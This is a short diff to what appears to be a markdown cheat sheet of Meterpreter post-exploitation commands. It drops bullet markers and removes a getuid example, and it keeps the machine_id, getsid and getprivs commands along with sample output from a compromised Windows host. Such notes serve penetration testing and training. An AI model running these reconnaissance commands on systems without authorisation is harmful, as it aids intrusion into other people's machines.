@@ -23,27 +23,20 @@ Meterpreter     : x64/windows
 meterpreter > uuid
 ```
 
-* Get current session ID
+Get current session ID
 
 ```
 meterpreter > machine_id
 ```
 
-* Discover Username
- 
-```
-meterpreter > getuid
-Server username: Defalt\Winpwn10
-```
-
-* Discover SID
+Discover SID
 
 ```
 meterpreter > getsid
 Server SID: S-1-5-21-2079428845-521281716-553417191-1001
 ```
 
-* Retrieve Privileges
+Retrieve Privileges
 
 ```
 meterpreter > getprivs
